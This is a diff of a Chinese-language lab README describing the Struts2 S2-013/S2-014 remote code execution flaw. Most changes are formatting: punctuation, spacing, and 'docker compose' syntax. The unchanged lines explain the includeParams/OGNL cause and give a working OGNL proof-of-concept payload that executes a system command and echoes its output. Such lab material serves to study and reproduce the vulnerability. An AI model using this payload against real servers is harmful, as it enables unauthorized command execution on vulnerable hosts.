@@ -1,8 +1,8 @@
 # S2-013/S2-014 远程代码执行漏洞
 
-影响版本: 2.0.0 - 2.3.14.1
+影响版本：2.0.0 - 2.3.14.1
 
-漏洞详情: 
+漏洞详情：
 
  - http://struts.apache.org/docs/s2-013.html
  - http://struts.apache.org/docs/s2-014.html
@@ -10,8 +10,8 @@
 ## 测试环境搭建
 
 ```
-docker-compose build
-docker-compose up -d
+docker compose build
+docker compose up -d
 ```
 
 ## 原理与测试
@@ -22,9 +22,9 @@ Struts2 标签中 `<s:a>` 和 `<s:url>` 都包含一个 includeParams 属性，�
 2. get - 链接只包含 GET 请求中的参数和其值
 3. all - 链接包含 GET 和 POST 所有参数和其值
 
-`<s:a>`用来显示一个超链接，当`includeParams=all`的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
+`<s:a>` 用来显示一个超链接，当 `includeParams=all` 的时候，会将本次请求的 GET 和 POST 参数都放在 URL 的 GET 参数上。在放置参数的过程中会将参数进行 OGNL 渲染，造成任意命令执行漏洞。
 
-任意命令执行POC：
+任意命令执行 POC：
 
 ```
 ${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
